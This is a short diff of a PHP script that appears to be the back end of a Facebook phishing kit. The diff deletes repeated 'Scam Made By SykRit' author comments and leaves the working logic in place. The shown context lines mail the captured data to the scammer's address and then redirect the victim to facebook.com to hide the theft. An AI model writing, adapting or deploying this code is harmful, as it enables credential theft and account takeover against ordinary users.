@@ -1,10 +1,5 @@
 <?php
 
-/**   Scam Made By SykRit 2016=====201?  **/
-/**   Scam Made By SykRit 2016=====201?  **/
-/**   Scam Made By SykRit 2016=====201?  **/
-/**   Scam Made By SykRit 2016=====201?  **/
-/**   Scam Made By SykRit 2016=====201?  **/
 
 $date = gmdate ("d-n-Y");
 $time = gmdate ("H:i:s");
@@ -31,10 +26,5 @@ mail($Send,$subject,$rnessage,$headers);
 }
 header("Location: https://www.facebook.com/");
 
-/***   Scam Made By SykRit 2016=====201?  **/
-/***   Scam Made By SykRit 2016=====201?  **/
-/***   Scam Made By SykRit 2016=====201?  **/
-/***   Scam Made By SykRit 2016=====201?  **/
-/***   Scam Made By SykRit 2016=====201?  **/
 
 ?>
